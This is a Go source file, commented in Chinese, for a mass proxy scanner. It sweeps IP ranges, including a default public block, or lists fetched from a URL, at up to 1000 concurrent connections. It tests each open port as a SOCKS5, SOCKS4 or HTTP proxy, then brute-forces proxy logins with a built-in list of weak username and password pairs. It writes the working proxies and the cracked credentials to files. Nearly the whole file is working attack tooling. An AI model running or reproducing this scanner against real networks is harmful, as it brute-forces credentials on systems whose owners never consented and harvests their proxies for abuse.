package main

import (
	"bufio"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/cheggaaa/pb/v3"
	"golang.org/x/net/proxy"
	"golang.org/x/time/rate"
)

// ==================== 配置与常量 ====================
var (
	weakPasswords = [][2]string{
		{"123456", "123456"}, {"password", "password"}, {"admin", "admin"},
		{"admin", "123456"}, {"root", "root"}, {"root", "123456"},
		{"123456789", "123456789"}, {"qwerty", "qwerty"}, {"12345", "12345"},
		{"12345678", "12345678"}, {"111111", "111111"}, {"user", "user"},
		{"user", "password"}, {"123", "123"}, {"proxy", "proxy"}, {"socks5", "socks5"},
		{"1234567", "1234567"}, {"iloveyou", "iloveyou"}, {"123123", "123123"},
		{"000000", "000000"}, {"welcome", "welcome"}, {"secret", "secret"},
		{"dragon", "dragon"}, {"monkey", "monkey"}, {"football", "football"},
		{"letmein", "letmein"}, {"sunshine", "sunshine"}, {"baseball", "baseball"},
		{"princess", "princess"}, {"admin123", "admin123"}, {"superman", "superman"},
		{"guest", "guest"}, {"", "123456"}, {"admin", ""}, {"", "admin"},
		{"test", "test"}, {"demo", "demo"},
	}
	protocols = []string{"socks5", "http", "socks4"}

	countryCache      sync.Map
	validCount  int64
	seenProxies sync.Map

	// 全局文件句柄
	detailFile *os.File
	validFile  *os.File
	logFile    *os.File

	countryCacheFile = "country_cache.json"
	limiter          = rate.NewLimiter(rate.Every(time.Second/100), 100)

	detailMu sync.Mutex
	validMu  sync.Mutex
)

// ==================== 加载弱密码函数 ====================
func loadWeakPasswords(file string) [][2]string {
	data, err := os.ReadFile(file)
	if err != nil {
		log.Printf("Warning: failed to load weak passwords file: %v", err)
		return weakPasswords
	}
	var list [][2]string
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, ":", 2)
		if len(parts) == 2 {
			list = append(list, [2]string{parts[0], parts[1]})
		}
	}
	return list
}

// ==================== 结果结构 ====================
type Result struct {
	IP       string
	Port     int
	Scheme   string
	Latency  int
	ExportIP string
	Country  string
	Auth     string
	IsWeak   bool
}

// ==================== 任务结构 ====================
type scanTask struct {
	IP   string
	Port int
}

// ==================== 主函数 ====================
func main() {
	ipRange := flag.String("ip-range", "", "IP range: 192.168.1.1-192.168.1.255 or CIDR")
	portInput := flag.String("port", "", "Ports: 1080 / 80 8080 / 1-65535 or comma/space separated")
	threads := flag.Int("threads", 0, "Max concurrent connections")
	timeout := flag.Duration("timeout", 0, "Timeout per request (e.g. 5s)")
	urlInput := flag.String("url", "", "URL to fetch IP:port list from")
	flag.Parse()

	loadCountryCache()
	defer saveCountryCache()

	var err error
	logFile, err = os.OpenFile("scan.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer logFile.Close()
	log.SetOutput(io.MultiWriter(os.Stdout, logFile))
	log.SetFlags(log.LstdFlags)
	log.Printf("[*] 扫描开始: %s", time.Now().Format("2006-01-02 15:04:05"))

	defaultStart := "157.254.32.0"
	defaultEnd := "157.254.52.255"
	defaultPort := "1080"
	defaultThreads := 1000
	defaultTimeout := 5 * time.Second

	finalIPRange := *ipRange
	finalPortInput := *portInput
	finalURL := *urlInput
	finalThreads := *threads
	finalTimeout := *timeout

	if finalThreads == 0 {
		finalThreads = promptInt("最大并发数（默认: "+strconv.Itoa(defaultThreads)+"):", defaultThreads)
	}
	if finalTimeout == 0 {
		finalTimeout = promptDuration("超时时间（如 5s，默认: 5s）: ", defaultTimeout)
	}

	weakPasswords = loadWeakPasswords("weak_passwords.txt")

	detailFile, err = os.OpenFile("result_detail.txt", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		log.Fatal("打开 result_detail.txt 失败: ", err)
	}
	validFile, err = os.OpenFile("proxy_valid.txt", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		log.Fatal("打开 proxy_valid.txt 失败: ", err)
	}
	defer detailFile.Close()
	defer validFile.Close()

	log.Printf("[*] 最大并发: %d", finalThreads)
	log.Printf("[*] 超时时间: %v", finalTimeout)

	taskChan := make(chan scanTask, finalThreads*2)
	ctx, cancel := context.WithCancel(context.Background())
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		log.Println("[!] 收到中断信号，正在优雅退出...")
		cancel()
	}()

	bar := pb.New(0)
	bar.SetWriter(io.MultiWriter(os.Stdout, logFile))
	bar.Set("prefix", "Scanning ")
	bar.Start()

	go func() {
		defer close(taskChan)
		// URL 加载优先
		if finalURL != "" {
			ips, portsFromURL, err := fetchAddrsFromURLStream(finalURL, finalTimeout)
			if err != nil {
				log.Printf("URL 加载失败 → 回退交互输入: %v", err)
			} else {
				if len(portsFromURL) == 0 {
					if finalPortInput == "" {
						finalPortInput = prompt("URL 未包含端口，请输入端口（默认: 1080）: ", "1080")
					}
					ports, _ := parsePorts(finalPortInput)
					for _, ip := range ips {
						for _, p := range ports {
							select {
							case taskChan <- scanTask{IP: ip, Port: p}:
							case <-ctx.Done():
								return
							}
						}
					}
				} else {
					for _, ip := range ips {
						for _, p := range portsFromURL {
							select {
							case taskChan <- scanTask{IP: ip, Port: p}:
							case <-ctx.Done():
								return
							}
						}
					}
				}
				return
			}
		}

		if finalIPRange == "" {
			finalIPRange = promptIPRange(defaultStart, defaultEnd)
		}
		ipChan, err := ipGenerator(finalIPRange)
		if err != nil {
			log.Printf("IP 范围解析失败: %v", err)
			return
		}

		if finalPortInput == "" {
			finalPortInput = prompt("端口（默认: "+defaultPort+"): ", defaultPort)
		}
		ports, _ := parsePorts(finalPortInput)

		for ip := range ipChan {
			for _, port := range ports {
				select {
				case taskChan <- scanTask{IP: ip, Port: port}:
				case <-ctx.Done():
					return
				}
			}
		}
	}()

	var wg sync.WaitGroup
	sem := make(chan struct{}, finalThreads)
	totalScanned := int64(0)

	for task := range taskChan {
		current := atomic.AddInt64(&totalScanned, 1)
		wg.Add(1)
		sem <- struct{}{}
		go func(t scanTask) {
			defer wg.Done()
			defer func() { <-sem }()

			select {
			case <-ctx.Done():
				return
			default:
			}

			result := scanProxy(ctx, t.IP, t.Port, finalTimeout)
			if result.Scheme != "" {
				key := fmt.Sprintf("%s:%d", result.IP, result.Port)
				if _, loaded := seenProxies.LoadOrStore(key, true); !loaded {
					atomic.AddInt64(&validCount, 1)
					writeResult(result)
				}
			}
			bar.Increment()
		}(task)
	}

	wg.Wait()
	bar.Finish()
	log.Printf("[+] 已保存 %d 个代理 → proxy_valid.txt", atomic.LoadInt64(&validCount))
}

// ==================== 从 URL 流式加载 ====================
func fetchAddrsFromURLStream(u string, timeout time.Duration) ([]string, []int, error) {
	log.Printf("[*] 正在从 URL 流式加载代理列表: %s", u)
	client := &http.Client{
		Timeout:       timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
	}
	resp, err := client.Get(u)
	if err != nil {
		return nil, nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, nil, fmt.Errorf("status %d", resp.StatusCode)
	}

	scanner := bufio.NewScanner(resp.Body)
	var ips []string
	portSet := make(map[int]bool)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || !strings.Contains(line, ":") {
			continue
		}
		parts := strings.SplitN(line, ":", 2)
		ipStr := strings.TrimSpace(parts[0])
		portStr := strings.TrimSpace(parts[1])
		port, err := strconv.Atoi(portStr)
		if err != nil || port <= 0 || port > 65535 {
			continue
		}
		if net.ParseIP(ipStr) == nil {
			continue
		}
		ips = append(ips, ipStr)
		portSet[port] = true
	}

	var ports []int
	for p := range portSet {
		ports = append(ports, p)
	}
	sort.Ints(ports)

	if err := scanner.Err(); err != nil {
		return nil, nil, err
	}
	log.Printf("[*] URL 加载完成: %d 个 IP, %d 个端口", len(ips), len(ports))
	return ips, ports, nil
}

// ==================== 交互输入 ====================
func prompt(msg, def string) string {
	fmt.Print(msg)
	scanner := bufio.NewScanner(os.Stdin)
	if scanner.Scan() {
		input := strings.TrimSpace(scanner.Text())
		if input != "" {
			return input
		}
	}
	return def
}
func promptInt(msg string, def int) int {
	s := prompt(msg, strconv.Itoa(def))
	i, err := strconv.Atoi(s)
	if err != nil || i <= 0 {
		return def
	}
	return i
}
func promptDuration(msg string, def time.Duration) time.Duration {
	s := prompt(msg, def.String())
	d, err := time.ParseDuration(s)
	if err != nil {
		return def
	}
	return d
}
func promptIPRange(start, end string) string {
	s := prompt("起始 IP（默认: "+start+"): ", start)
	e := prompt("结束 IP（默认: "+end+"): ", end)
	return s + "-" + e
}

// ==================== IP 生成器 ====================
func ipGenerator(r string) (<-chan string, error) {
	if strings.Contains(r, "/") {
		return cidrGenerator(r)
	}
	return rangeDashGenerator(r)
}

// CIDR 生成器
func cidrGenerator(cidr string) (<-chan string, error) {
	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}
	ch := make(chan string)
	go func() {
		defer close(ch)
		for ip := copyIP(ipnet.IP.Mask(ipnet.Mask)); ipnet.Contains(ip); incIP(ip) {
			ch <- ip.String()
		}
	}()
	return ch, nil
}

// Dash 范围生成器（安全版）
func rangeDashGenerator(r string) (<-chan string, error) {
	parts := strings.Split(r, "-")
	if len(parts) != 2 {
		return nil, fmt.Errorf("invalid IP range format")
	}
	start := net.ParseIP(strings.TrimSpace(parts[0])).To4()
	end := net.ParseIP(strings.TrimSpace(parts[1])).To4()
	if start == nil || end == nil {
		return nil, fmt.Errorf("invalid IPv4 address")
	}

	ch := make(chan string)
	go func() {
		defer close(ch)
		for ip := copyIP(start); compareIP(ip, end) <= 0; incIP(ip) {
			ch <- ip.String()
		}
	}()
	return ch, nil
}

// ==================== 安全端口解析 ====================
func parsePorts(input string) ([]int, error) {
	var ports []int
	input = strings.ReplaceAll(input, ",", " ")
	for _, p := range strings.Fields(input) {
		if strings.Contains(p, "-") {
			r := strings.Split(p, "-")
			if len(r) != 2 {
				continue
			}
			s, err := strconv.Atoi(strings.TrimSpace(r[0]))
			if err != nil || s < 1 {
				continue
			}
			e, err := strconv.Atoi(strings.TrimSpace(r[1]))
			if err != nil || e > 65535 {
				continue
			}
			if s > e {
				s, e = e, s
			}
			for i := s; i <= e; i++ {
				ports = append(ports, i)
			}
		} else {
			port, err := strconv.Atoi(strings.TrimSpace(p))
			if err != nil || port < 1 || port > 65535 {
				continue
			}
			ports = append(ports, port)
		}
	}
	return ports, nil
}

// ==================== IP 辅助函数 ====================
func copyIP(ip net.IP) net.IP {
	dup := make(net.IP, len(ip))
	copy(dup, ip)
	return dup
}
func incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}
func compareIP(a, b net.IP) int {
	a = a.To4()
	b = b.To4()
	if a == nil || b == nil {
		return strings.Compare(a.String(), b.String())
	}
	for i := 0; i < 4; i++ {
		if a[i] < b[i] {
			return -1
		} else if a[i] > b[i] {
			return 1
		}
	}
	return 0
}

// ==================== 主扫描逻辑 ====================
func scanProxy(ctx context.Context, ip string, port int, timeout time.Duration) Result {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), timeout/2)
	if err != nil {
		return Result{}
	}
	conn.Close()

	result := Result{IP: ip, Port: port}
	for _, scheme := range protocols {
		if ctx.Err() != nil {
			return result
		}
		ok, lat, exportIP := testProxy(ctx, scheme, ip, port, nil, timeout)
		if ok && isPublicIP(exportIP) {
			result.Scheme = scheme
			result.Latency = lat
			result.ExportIP = exportIP
			result.Country = getCountry(exportIP)
			if result.Country == "XX" {
				result.Country = getCountry(ip)
			}
			return result
		}
		if scheme == "socks4" {
			continue
		}
		for _, pair := range weakPasswords {
			if ctx.Err() != nil {
				return result
			}
			auth := &proxy.Auth{User: pair[0], Password: pair[1]}
			ok, lat, exportIP := testProxy(ctx, scheme, ip, port, auth, timeout)
			if ok && isPublicIP(exportIP) {
				result.Scheme = scheme
				result.Latency = lat
				result.ExportIP = exportIP
				result.Country = getCountry(exportIP)
				if result.Country == "XX" {
					result.Country = getCountry(ip)
				}
				result.Auth = fmt.Sprintf("%s:%s", pair[0], pair[1])
				result.IsWeak = true
				return result
			}
		}
	}
	return result
}

// ==================== 协议测试 ====================
func testProxy(ctx context.Context, scheme, ip string, port int, auth *proxy.Auth, timeout time.Duration) (bool, int, string) {
	if err := limiter.Wait(ctx); err != nil {
		return false, 0, ""
	}
	addr := fmt.Sprintf("%s:%d", ip, port)
	testURL := "http://ifconfig.me"

	switch scheme {
	case "http":
		client := &http.Client{Timeout: timeout}
		if auth != nil {
			proxyURL, _ := url.Parse(fmt.Sprintf("http://%s:%s@%s:%d", auth.User, auth.Password, ip, port))
			client.Transport = &http.Transport{Proxy: http.ProxyURL(proxyURL)}
		} else {
			proxyURL, _ := url.Parse(fmt.Sprintf("http://%s:%d", ip, port))
			client.Transport = &http.Transport{Proxy: http.ProxyURL(proxyURL)}
		}
		start := time.Now()
		resp, err := client.Get(testURL)
		if err != nil {
			return false, 0, ""
		}
		defer resp.Body.Close()
		body, _ := io.ReadAll(resp.Body)
		return true, int(time.Since(start).Milliseconds()), strings.TrimSpace(string(body))
	case "socks5":
		var d proxy.Dialer = proxy.Direct
		if auth != nil {
			dialURL := fmt.Sprintf("%s:%s@%s:%d", auth.User, auth.Password, ip, port)
			socks5URL, _ := url.Parse("socks5://" + dialURL)
			d, _ = proxy.FromURL(socks5URL, proxy.Direct)
		} else {
			socks5URL, _ := url.Parse(fmt.Sprintf("socks5://%s:%d", ip, port))
			d, _ = proxy.FromURL(socks5URL, proxy.Direct)
		}
		start := time.Now()
		conn, err := d.Dial("tcp", "ifconfig.me:80")
		if err != nil {
			return false, 0, ""
		}
		conn.Close()
		return true, int(time.Since(start).Milliseconds()), ip
	case "socks4":
		start := time.Now()
		conn, err := net.DialTimeout("tcp", addr, timeout)
		if err != nil {
			return false, 0, ""
		}
		conn.Close()
		return true, int(time.Since(start).Milliseconds()), ip
	default:
		return false, 0, ""
	}
}

// ==================== 结果保存 ====================
func writeResult(r Result) {
	detailMu.Lock()
	defer detailMu.Unlock()
	fmt.Fprintf(detailFile, "%+v\n", r)
	validMu.Lock()
	defer validMu.Unlock()
	fmt.Fprintf(validFile, "%s://%s:%d\n", r.Scheme, r.IP, r.Port)
}

// ==================== 公网 IP 判断 ====================
func isPublicIP(ipStr string) bool {
	ip := net.ParseIP(ipStr)
	if ip == nil {
		return false
	}
	ip4 := ip.To4()
	if ip4 == nil {
		return false
	}
	if ip4[0] == 10 || (ip4[0] == 172 && ip4[1] >= 16 && ip4[1] <= 31) ||
		(ip4[0] == 192 && ip4[1] == 168) || (ip4[0] == 169 && ip4[1] == 254) {
		return false
	}
	return true
}

// ==================== 国家解析 ====================
func getCountry(ip string) string {
	if v, ok := countryCache.Load(ip); ok {
		return v.(string)
	}
	return "XX"
}
func loadCountryCache() {
	data, err := os.ReadFile(countryCacheFile)
	if err != nil {
		return
	}
	_ = json.Unmarshal(data, &countryCache)
}
func saveCountryCache() {
	data, _ := json.Marshal(countryCache)
	_ = os.WriteFile(countryCacheFile, data, 0644)
}
